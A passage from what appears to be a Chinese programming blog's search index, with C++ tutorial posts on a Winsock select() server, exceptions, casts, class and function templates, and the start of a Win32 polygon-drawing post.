(readAllSocket.fd_array[i] == serverSocket) &#123; sockaddr_in clientAddr = &#123; 0 &#125;; int addrLen = sizeof(clientAddr); SOCKET clientSocket = accept(serverSocket,(sockaddr *)&amp;clientAddr,&amp;addrLen); if (clientSocket == INVALID_SOCKET) &#123; cout &lt;&lt; \"accept Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; continue; &#125; if (allSocket.fd_count == FD_SETSIZE) &#123; cout &lt;&lt; \"服务器已满\" &lt;&lt; endl; send(clientSocket, \"服务器爆满,请稍后连接...\", sizeof(\"服务器爆满,请稍后连接...\\n\"), 0); closesocket(clientSocket); continue; &#125; cout &lt;&lt; \"连接服务器成功 : \" &lt;&lt; inet_ntoa(clientAddr.sin_addr) &lt;&lt; endl; int sendRes = send(clientSocket, \"连接成功...\", sizeof(\"连接成功...\") + 1,0); FD_SET(clientSocket, &amp;allSocket); &#125; //收消息 else &#123; char recBuf[1500] = &#123; 0 &#125;; int recvRes = recv(readAllSocket.fd_array[i], recBuf, sizeof(recBuf), 0); if (recvRes == SOCKET_ERROR) &#123; int WSAError = WSAGetLastError(); cout &lt;&lt; \"recv Error: \" &lt;&lt; WSAError &lt;&lt; endl; if (WSAError == 10054) &#123; cout &lt;&lt; \"客户端强制下线了\" &lt;&lt; endl; FD_CLR(readAllSocket.fd_array[i],&amp;allSocket); continue; &#125; &#125; else if (recvRes == 0) &#123; cout &lt;&lt; \"客户端下线了\" &lt;&lt; endl; FD_CLR(readAllSocket.fd_array[i], &amp;allSocket); continue; &#125; else &#123; cout &lt;&lt; recBuf &lt;&lt; endl; &#125; &#125; &#125;//for readAllsocket //处理异常错误 for (u_int i = 0; i &lt; exAllSocket.fd_count; i++) &#123; char exBuf[1024] = &#123; 0 &#125;; int exLen = 1024; getsockopt(exAllSocket.fd_array[i], SOL_SOCKET, SO_ERROR, exBuf, &amp;exLen); cout &lt;&lt;\"异常错误: \" &lt;&lt; exBuf&lt;&lt; endl; &#125;// for exAllSocket &#125;//else if 有消息 //select出错了 else &#123; cout &lt;&lt; \"select Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; &#125; &#125;//while(true) for (u_int i = 0; i &lt; allSocket.fd_count; i++) &#123; closesocket(allSocket.fd_array[i]); &#125; closesocket(serverSocket); WSACleanup(); return 0;&#125;","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"异常类型和异常变量的生命周期","slug":"cpp0073-异常类型和异常变量的生命周期","date":"2021-06-20T00:14:35.000Z","updated":"2021-06-20T00:57:23.179Z","comments":true,"path":"2021/06/20/cpp0073-异常类型和异常变量的生命周期/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0073-异常类型和异常变量的生命周期/","excerpt":"","text":"异常类型和异常变量的生命周期 throw的异常是有类型的，可以使，数字、字符串、类对象。 throw的异常是有类型的，catch严格按照类型进行匹配。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class MyException &#123;public: MyException()&#123;&#125; //有参构造 MyException(const char * str)&#123; mStr = new char[strlen(str) + 1]; strcpy(mStr,str); &#125; //拷贝构造 MyException(const MyException &amp; mE) &#123; this -&gt; mStr = new char[strlen(mE.mStr) + 1]; strcpy(this-&gt;mStr,mE.mStr); &#125; void what() &#123; cout &lt;&lt; mStr &lt;&lt; endl; &#125; ~MyException() &#123; if (mStr != NULL) &#123; delete[] mStr; &#125; cout &lt;&lt; \"对象析构\" &lt;&lt; endl; &#125;private: char * mStr;&#125;;void test01() &#123; //创建一个匿名对象 throw MyException(\"未知异常\");&#125;int main(char *argv[], int argc)&#123; try &#123; test01(); &#125; catch (MyException mE) &#123; mE.what(); &#125; return 0;&#125; throw抛出去的如果是普通类型或者引用变量,它的生命周期是在catch结束后释放掉 如果throw抛出去的是一个指针,那么在进入catch前被释放掉 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class MyException &#123;public: MyException()&#123;&#125; //有参构造 MyException(const char * str)&#123; cout &lt;&lt; \"对象构造\" &lt;&lt; endl; mStr = new char[strlen(str) + 1]; strcpy(mStr,str); &#125; //拷贝构造 MyException(const MyException &amp; mE) &#123; this -&gt; mStr = new char[strlen(mE.mStr) + 1]; strcpy(this-&gt;mStr,mE.mStr); &#125; void what() &#123; cout &lt;&lt; mStr &lt;&lt; endl; &#125; ~MyException() &#123; if (mStr != NULL) &#123; delete[] mStr; &#125; cout &lt;&lt; \"对象析构\" &lt;&lt; endl; &#125;private: char * mStr;&#125;;void test01() &#123; //创建一个匿名对象,如果抛出的是指针,会在进入catch前就释放掉该指针 cout &lt;&lt; \"&amp;(MyException(未知异常))\" &lt;&lt; endl; throw &amp;(MyException(\"未知异常\"));&#125;void test02() &#123; //创建一个匿名对象,抛出一个普通对象,用引用去接 cout &lt;&lt; \"MyException(未知异常)\" &lt;&lt; endl; throw MyException(\"未知异常\");&#125;void test03() &#123; //创建一个匿名对象,抛出一个普通对象 cout &lt;&lt; \"MyException(未知异常) 用普通对象来接\" &lt;&lt; endl; throw MyException(\"未知异常\");&#125;int main(char *argv[], int argc)&#123; try &#123; test01(); &#125; catch (MyException * mE) &#123; cout &lt;&lt; \"未知异常\" &lt;&lt; endl; &#125; cout &lt;&lt; \"=================================\" &lt;&lt; endl; try &#123; test02(); &#125; catch (MyException &amp; mE) &#123; cout &lt;&lt; \"未知异常\" &lt;&lt; endl; &#125; cout &lt;&lt; \"=================================\" &lt;&lt; endl; try &#123; test03(); &#125; catch (MyException mE) &#123; cout &lt;&lt; \"未知异常\" &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"异常接口声明","slug":"cpp0072-异常接口声明","date":"2021-06-19T23:55:35.000Z","updated":"2021-06-20T00:05:55.745Z","comments":true,"path":"2021/06/20/cpp0072-异常接口声明/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0072-异常接口声明/","excerpt":"","text":"异常接口声明 为了加强程序的可读性，可以在函数声明中列出可能抛出的所有异常类 型，例如： void func() throw (A, B, C , D);这个函数func（）能够且只能抛出类 型A B C D及其子类型的异常。 如果在函数声明中没有包含异常接口声明，则次函数可以抛掷任何类型的 异常，例如： void func(); 一个不抛掷任何类型异常的函数可以声明为： void func() throw(); 如果一个函数抛出了它的异常接口声明所不允许抛出的异常，unexpected 函数会被调用，该函数默认行为调用terminate函数中止程序。 12345678910111213141516171819202122232425262728293031323334353637383940#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;//只能抛出int,double,char这三个类型的异常//在VS中可能抛出其他类型的异常不会出错,但在Linux会报错const char * gStr = \"abc\";void test01()throw(int,double,char) &#123; throw gStr;&#125;//不能抛出异常void test02()throw() &#123;&#125;//可以抛出所有类型的异常void test03() &#123;&#125;int main(char *argv[], int argc)&#123; try &#123; test01(); &#125; catch (int) &#123; &#125; catch (const char * y) &#123; cout &lt;&lt; y &lt;&lt; endl; &#125; catch (double) &#123; &#125; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"栈解旋","slug":"cpp0071-栈解旋","date":"2021-06-19T23:33:40.000Z","updated":"2021-06-19T23:41:28.962Z","comments":true,"path":"2021/06/20/cpp0071-栈解旋/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0071-栈解旋/","excerpt":"","text":"栈解旋 异常被抛出后，从进入try块起，到异常被抛掷前，这期间在栈上的构造的 所有对象，都会被自动析构。析构的顺序与构造的顺序相反。这一过程称为栈 的解旋(unwinding)。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Person &#123;public: Person() &#123; cout &lt;&lt; \"对象构造\" &lt;&lt; endl; &#125; ~Person() &#123; cout &lt;&lt; \"对象析构\" &lt;&lt; endl; &#125;&#125;;double dev(double x, double y) &#123; Person p1, p2; if (y == 0) &#123; throw y; &#125; return x / y;&#125;void test01() &#123; dev(10,0);&#125;void test02() &#123; try &#123; test01(); &#125; catch (double y) //异常是根据类型进行匹配的 可以是catch (double)不接收异常的值 &#123; cout &lt;&lt; \"除数为: \" &lt;&lt; y &lt;&lt; endl; &#125;&#125;int main(char *argv[], int argc)&#123; test02(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"异常基本语法","slug":"cpp0070-异常基本语法","date":"2021-06-19T23:26:16.000Z","updated":"2021-06-19T23:33:13.078Z","comments":true,"path":"2021/06/20/cpp0070-异常基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0070-异常基本语法/","excerpt":"","text":"异常基本语法 如果抛出异常后,不处理异常,程序会自动结束 异常是一层层向上抛出的,直到处理异常为止,如果抛到顶层还没有处理,程序自动结束. c++的异常是必须处理的 12345678910//抛异常throw 变量/对象/值/指针 try&#123; //可能会出现异常的语句块&#125;catch(类型/类型 变量名)&#123; //处理异常&#125; 1234567891011121314151617181920212223242526272829303132333435#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;double dev(double x, double y) &#123; if (y == 0) &#123; throw y; //抛异常 &#125; return x / y;&#125;void test01() &#123; dev(10,0);&#125;void test02() &#123; try &#123; //可能会出现异常 test01(); &#125; catch (double y) //异常是根据类型进行匹配的 可以是catch (double)不接收异常的值 &#123; cout &lt;&lt; y &lt;&lt; endl; &#125;&#125;int main(char *argv[], int argc)&#123; test02(); cout &lt;&lt; 123 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类型转换","slug":"cpp0069-类型转换","date":"2021-06-19T21:52:15.000Z","updated":"2021-06-19T23:09:22.303Z","comments":true,"path":"2021/06/20/cpp0069-类型转换/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0069-类型转换/","excerpt":"","text":"类型转换 C++提供了4种类型转换，分别处理不同的场合应用 static_cast 静态类型转换。 可以转换基本数据类型和具有继承关系的对象指针或引用 static_cast&lt;目标类型&gt; (标识符) reinterpret_cast重新解释类型转换。 仅仅重新解释类型，但没有进行二进制的转换： 1. 转换的类型必须是一个指针、引用、算术类型、函数指针或者成员指针。 2. 在比特位级别上进行转换。它可以把一个指针转换成一个整数，也可以把一个整数转换成一个指针(先把一个指针转换成一个整数，在把该整数转换成原类型的指针，还可以得到原先的指针值)。但不能将非32bit的实例转成指针。 3. 最普通的用途就是在函数指针类型之间进行转换。 4. 很难保证移植性。 12345678910111213141516#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;typedef void(*VFun)(int, int);typedef double(*DFun)(int, int);int main(char *argv[], int argc)&#123; VFun vf = NULL; DFun df = reinterpret_cast&lt;DFun&gt;(vf); return 0;&#125; dynamic_cast 子类和父类之间的多态类型转换。 dynamic_cast&lt;目标类型&gt; (标识符) 只能转换具有继承关系的指针或引用,会做类型安全检查 只能从子类转父类,因为一般子类内存空间是大于等于父类的,如果子类内存空间大于父类，把父类指针转换成子类指针,会越界处理，所以不安全。 如果转换失败返回NULL 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Base &#123;private: char * mName;&#125;;class Son : public Base &#123;private: int age;&#125;;class Animal &#123; char * mName;&#125;;int main(char *argv[], int argc)&#123; Base * pBase = NULL; Son * pSon = NULL; Animal * pAnimal = NULL; //pSon = dynamic_cast&lt;Son *&gt;(pBase); 父类指针不能装子类指针 //pSon = dynamic_cast&lt;Son *&gt;(pAnimal); 不具有继承关系的不能转换 pBase = dynamic_cast&lt;Son *&gt;(pSon); //子类转父类可以 return 0;&#125; const_cast 去掉const属性转换。 const_cast&lt;目标类型&gt;(标识符) 目标类类型只能是指针或引用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Base &#123;private: char * mName;&#125;;class Son : public Base &#123;private: int age;&#125;;class Animal &#123; char * mName;&#125;;void test() &#123; //基本数据类型 int a = 10; const int &amp; b = a; int &amp;c = const_cast&lt;int &amp;&gt;(b); c = 20; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; c &lt;&lt; endl;&#125;void test02() &#123; Base * a = NULL; const Base *b = a; Base * c = const_cast&lt;Base *&gt;(b); c = new(Base); cout &lt;&lt; \"===========================\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; c &lt;&lt; endl; delete c; c = NULL;&#125;int main(char *argv[], int argc)&#123; //基础数据类型 test(); //对象数据类型 test02(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类模板中的static成员","slug":"cpp0068-类模板中的static成员","date":"2021-06-18T23:33:17.000Z","updated":"2021-06-18T23:38:27.036Z","comments":true,"path":"2021/06/19/cpp0068-类模板中的static成员/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0068-类模板中的static成员/","excerpt":"","text":"类模板中的static成员 类模板中的static成员单独属于每一个实例化出来的类 也就是说每个具体化类的static成员都是不一样的,没有关联的 例如有一个模板类A中有一个static成员 类A&lt;int&gt;和类A&lt;double&gt;都有自己的static成员,他们两个的static成员是不同且没有关联的 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class A&#123;public: T value; static T a;&#125;;template &lt;class T&gt;T A&lt;T&gt;::a = 0;//类中的静态成员需要在类的外部进行初始化。int main(void)&#123; //1 模板类通过二次编译根据调用的代码生成了两个不同的类A 一个是A&lt;int&gt; 一个A&lt;char&gt; A&lt;int&gt; a1, a2, a3; A&lt;char&gt; b1, b2, b3; A&lt;int&gt;::a = 20; //改变A&lt;int&gt;的静态成员 A&lt;char&gt;::a = 'X';//改变A&lt;char&gt;的静态成员 cout &lt;&lt; \"a1:a = \" &lt;&lt; a1.a &lt;&lt; endl; //20 cout &lt;&lt; \"b1:a = \" &lt;&lt; b1.a &lt;&lt; endl;//'X' cout &lt;&lt; \"a2:a = \" &lt;&lt; a2.a &lt;&lt; endl; cout &lt;&lt; \"a3:a = \" &lt;&lt; a3.a &lt;&lt; endl; cout &lt;&lt; \"b2:a= \" &lt;&lt; b2.a &lt;&lt; endl;//'X' cout &lt;&lt; \"b3:a = \" &lt;&lt; b3.a &lt;&lt; endl;//'X' return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类模板的多文件编写","slug":"cpp0067-类模板的多文件编写","date":"2021-06-18T23:18:48.000Z","updated":"2021-06-18T23:32:09.100Z","comments":true,"path":"2021/06/19/cpp0067-类模板的多文件编写/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0067-类模板的多文件编写/","excerpt":"","text":"类模板的多文件编写 不建议类模板分多文件编写 如果多文件编写类模板,在调用实例化模板类要包含cpp实现 一般的类模板实现文件后缀名是hpp 如果不包含类实现,在调用具体化模板类时,因为编译器是逐个文件进行编译的，所以编译器在当前文件找不到类实现，会认为类实现在其他文件,然后编译器会自动跳过,交给链接器处理,而链接器又找不到具体化函数,就会报错 h头文件 1234567891011121314151617181920212223#pragma once#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class Complex&#123;public: Complex(); ~Complex(); Complex(T a, T b); void pirntComplex(); Complex operator+(Complex &amp;another); Complex operator-(Complex &amp;another);private: T a; T b;&#125;; hpp文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include \"Complext.h\"//最终通过第二次编译生成class Complex&lt;int&gt; 是在cpp文件中展开/*class Complex&lt;int&gt; &#123;&#125;*/template&lt;class T&gt;Complex&lt;T&gt;::Complex()&#123; this-&gt;a = 0; this-&gt;b = 0;&#125;template&lt;class T&gt;Complex&lt;T&gt;::~Complex()&#123;&#125;template&lt;class T&gt;Complex&lt;T&gt;::Complex(T a, T b)&#123; this-&gt;a = a; this-&gt;b = b;&#125;template&lt;class T&gt;void Complex&lt;T&gt;::pirntComplex()&#123; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl;&#125;template&lt;class T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt; &amp;another)&#123; Complex temp(this-&gt;a + another.a, this-&gt;b + another.b); return temp;&#125;template&lt;class T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator-(Complex&lt;T&gt; &amp;another)&#123; Complex temp(this-&gt;a - another.a, this-&gt;b - another.b); return temp;&#125; 12345678910111213141516171819202122232425262728#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;#include \"Complext.h\"#include \"Complext.hpp\" //不能够引入cpp#include &lt;vector&gt;//模板类的 方法的实现不能够用多文件编写。//如果实现多文件的 由于二次编译 真正的实现体是在cpp文件定义的。需要引入cpp头文件。using namespace std;int main(void)&#123; Complex&lt;int&gt; c1(10, 20); c1.pirntComplex(); Complex&lt;int&gt; c2(1, 2); Complex&lt;int&gt; c3; //调用无参构造 c3 = c1 + c2; c3.pirntComplex(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类模板的类外实现","slug":"cpp0066-类模板的类外实现","date":"2021-06-18T18:13:48.000Z","updated":"2021-06-18T23:02:47.919Z","comments":true,"path":"2021/06/19/cpp0066-类模板的类外实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0066-类模板的类外实现/","excerpt":"","text":"类模板的类外实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;//在类的外面声明一下友元模板函数template&lt;class T&gt;class Person;template&lt;class T&gt;void Show(Person&lt;T&gt; &amp;p);template&lt;class T&gt;ostream &amp; operator&lt;&lt; (ostream &amp; os, Person&lt;T&gt; &amp;p);template&lt;class T&gt;class Person &#123;public: Person(); Person(T name); friend ostream &amp; operator&lt;&lt; &lt;&gt; (ostream &amp; os, Person&lt;T&gt; &amp;p); Person&lt;T&gt; operator=(Person&lt;T&gt; &amp; tp); friend void Show&lt;&gt;(Person&lt;T&gt; &amp;p);private: T mName;&#125;;template&lt;class T&gt;void Show(Person&lt;T&gt; &amp;p) &#123; cout &lt;&lt; p.mName &lt;&lt; endl;&#125;template&lt;class T&gt;Person&lt;T&gt; Person&lt;T&gt;::operator=(Person&lt;T&gt; &amp; tp)&#123; this-&gt;mName = tp.mName; return *this;&#125;template&lt;class T&gt;ostream &amp; operator&lt;&lt; (ostream &amp; os, Person&lt;T&gt; &amp;p)&#123; os &lt;&lt; p.mName; return os;&#125;template&lt;class T&gt;Person&lt;T&gt;::Person()&#123;&#125;template&lt;class T&gt;Person&lt;T&gt;::Person(T name) &#123; mName = name;&#125;void test01() &#123; Person&lt;string&gt; p(\"小明\"); Person&lt;string&gt; p2(\"123\"); //p2 = p; //cout &lt;&lt; p2 &lt;&lt; endl; //cout &lt;&lt; p &lt;&lt; endl; Show(p); Show(p2);&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[],"tags":[]},{"title":"类模板的类内实现","slug":"cpp0065-类模板的类内实现","date":"2021-06-18T16:50:07.000Z","updated":"2021-06-18T16:58:03.010Z","comments":true,"path":"2021/06/19/cpp0065-类模板的类内实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0065-类模板的类内实现/","excerpt":"","text":"类模板的类内实现 1234567891011121314151617181920212223242526272829303132#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;template&lt;class T1,class T2&gt;class Person &#123;private: T1 mName; T2 mAge;public: Person()&#123;&#125; Person(T1 name,T2 age):mName(name),mAge(age) &#123;&#125; void show() &#123; cout &lt;&lt; mName &lt;&lt; \":\" &lt;&lt; mAge &lt;&lt; \"岁\" &lt;&lt; endl; &#125;&#125;;void test01() &#123; Person&lt;string, int&gt; p(\"小明\",18); p.show();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类模板派生普通类与类模板派生类模板","slug":"cpp0064-类模板派生普通类与类模板派生类模板","date":"2021-06-18T15:47:47.000Z","updated":"2021-06-18T22:04:31.661Z","comments":true,"path":"2021/06/18/cpp0064-类模板派生普通类与类模板派生类模板/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0064-类模板派生普通类与类模板派生类模板/","excerpt":"","text":"类模板派生普通类 1234567891011121314151617181920212223242526272829303132333435363738#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;template&lt;class T&gt;class A &#123;public: T mA; A()&#123;&#125; A(T a):mA(a)&#123;&#125;&#125;;//模板类派生普通类//结论：子类从模板类继承的时候，需要让编译器知道父类的数据类型具体是什么（数据类型的本质：固定大小内存块的别名）A&lt;int&gt;class B : public A&lt;int&gt; &#123;public: void show() &#123; cout &lt;&lt; mA &lt;&lt; endl; &#125; B(int a):A(a)&#123;&#125;&#125;;void test01() &#123; B b(100); b.show();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; 类模板派生类模板 12345678910111213141516171819202122232425262728293031323334353637383940414243#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;template&lt;class T&gt;class A &#123;public: T mA; A()&#123;&#125; A(T a)&#123; mA = a; &#125;&#125;;template&lt;class T&gt;class B : public A&lt;T&gt;&#123;public: B():A&lt;T&gt;()&#123;&#125; B(T a):A&lt;T&gt;(a)&#123;&#125; void show() &#123; //要显示的指明要调用哪个类实例的mA cout &lt;&lt; A&lt;T&gt;::mA &lt;&lt; endl; &#125;&#125;;void test01() &#123; B&lt;string&gt; b(\"wwww\"); cout &lt;&lt; b.mA &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类模板的基本语法","slug":"cpp0063-类模板的基本语法","date":"2021-06-18T15:07:46.000Z","updated":"2021-06-18T15:24:17.657Z","comments":true,"path":"2021/06/18/cpp0063-类模板的基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0063-类模板的基本语法/","excerpt":"","text":"类模板的基本语法 类模板必须显式指定类型 12345678910111213141516171819202122232425262728293031323334353637#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;template&lt;class T&gt;class Person &#123; private: T mA;public: Person()&#123;&#125; Person(T a) &#123; mA = a; &#125; void show() &#123; cout &lt;&lt; mA &lt;&lt; endl; &#125;&#125;;void test01() &#123; //类模板必须显示调用 Person&lt;string&gt; str(\"123\"); str.show();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"编译器对模板机制剖析","slug":"cpp0062-编译器对模板机制剖析","date":"2021-06-18T14:58:38.000Z","updated":"2021-06-18T22:05:26.870Z","comments":true,"path":"2021/06/18/cpp0062-编译器对模板机制剖析/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0062-编译器对模板机制剖析/","excerpt":"","text":"编译器对模板机制剖析 简析编译器的编译过程 123456g++ -E hello.c -o hello.i（预处理）g++ -S hello.i -o hello.s（编译）g++ -c hello.s -o hello.o（汇编）g++ hello.o -o hello（链接）以上四个步骤，可合成一个步骤g++ hello.c -o hello（直接编译链接成可执行目标文件） 编译器并不是把函数模板处理成能够处理任意类的函数 编译器从函数模板通过具体类型产生不同的函数 编译器会对函数模板进行两次编译,在声明的地方对模板代码本身进行编译； 在调用的地方对参数替换后的代码进行编译。","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数模板基本语法","slug":"cpp0061-函数模板基本语法","date":"2021-06-18T14:29:13.000Z","updated":"2021-06-18T22:05:15.666Z","comments":true,"path":"2021/06/18/cpp0061-函数模板基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0061-函数模板基本语法/","excerpt":"","text":"函数模板基本语法 语法 12345template&lt;class T1,...,class Tn&gt; //template&lt;typename T&gt;void FunName(T1 x1,...,Tn xn)&#123; //函数体&#125; template是语义是模板的意思，尖括号中先写关键字typename或是 class，后面跟一个类型T，此类即是虚拟的类型。至于为什么用T用的人多了，也 就是T了。 函数模板,只适用于函数的参数个数相同而类型不同,且函数体相同的情况。 如 果个数不同,则不能用函数模板。 普通函数会进行隐式的数据类型转换, 函数模板不提供隐式的数据类型转 换 必须是严格的匹配。 当函数模板和普通函数都符合调⽤用时,优先选择普通函数 当函数模板和普通函数都符合调用时,优先选择普通函数 若显示使用函数模板,则使用&lt;&gt; 类型列表 如果 函数模板产生更好的匹配 使用函数模板 123456789101112131415161718192021222324252627282930#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;template&lt;class T&gt; //template&lt;typename T&gt;void MySwap(T &amp;a,T &amp;b) &#123; T temp = a; cout &lt;&lt; a &lt;&lt; \" \" &lt;&lt; b &lt;&lt; endl; a = b; b = temp; cout &lt;&lt; a &lt;&lt; \" \" &lt;&lt; b &lt;&lt; endl;&#125;void test01() &#123; int a = 1, b = 2; double da = 1.1, db = 2.2; //隐式调用模板函数 MySwap(a,b); //显示调用模板函数 MySwap&lt;double&gt;(da,db);&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int Max(int a, int b)&#123;cout &lt;&lt; \"int Max(int a, int b)\" &lt;&lt; endl;return a &gt; b ? a : b;&#125;template&lt;typename T&gt;T Max(T a, T b)&#123; cout &lt;&lt; \"T Max(T a, T b)\" &lt;&lt; endl; return a &gt; b ? a : b;&#125;template&lt;typename T&gt;T Max(T a, T b, T c)&#123; cout &lt;&lt; \"T Max(T a, T b, T c)\" &lt;&lt; endl; return Max(Max(a, b), c);&#125;int main()&#123; int a = 1; int b = 2; cout &lt;&lt; Max(a, b) &lt;&lt; endl; //当函数模板和普通函数都符合调用时,优先选择普通函数 cout &lt;&lt; Max&lt;&gt;(a, b) &lt;&lt; endl; //若显示使用函数模板,则使用 &gt;类型列表 cout &lt;&lt; Max(3.0, 4.0) &lt;&lt; endl; //如果函数模板产生更好的匹配使用函数模板 cout &lt;&lt; Max(5.0, 6.0, 7.0) &lt;&lt; endl; //重载 cout &lt;&lt; Max('a', 100) &lt;&lt; endl; //调用普通函数可以隐式类型转换 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"画图","slug":"pwcp017-画图","date":"2021-06-12T17:34:56.000Z","updated":"2021-06-12T19:04:18.313Z","comments":true,"path":"2021/06/13/pwcp017-画图/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/13/pwcp017-画图/","excerpt":"","text":"画图 多边形 1BOOL POLYGON(HDC HDC, CONST POINT *LPPOINTS, INT NCOUNT)； HDC：设备环境句柄。 LPPOINTS：指向用于指定多边形顶点的POINT结构数组的指针。LPPOINTS中坐标以当前位置为原点。 NCOUNT：指定数组中顶点个数，此值必须大于等于2。 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值是0。 多个多边形 1BOOL PolyPolygon(HDC hdc, CONST POINT *lpPoints, CONST INT *lpPolyCounts, int nCount)； 参数： hdc：设备环境句柄。 lpPoints：指向定义多边形顶点的POINT结构数组的指针，各多边形是连续定义的，每个多边形通过画一条从最后中一个顶点到第一个顶点的线段而自动闭合起来，每个顶点应被定义一次。 lpPolyCounts：指向整数数组的指针，每个整数指定相应多边表的点数，每个整数必须大于等于2。 nCount：指定多边形的总个数。 返回值：如果函数调用成功，返回值非零，否则返回值是0。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209// 画图.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"画图.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int 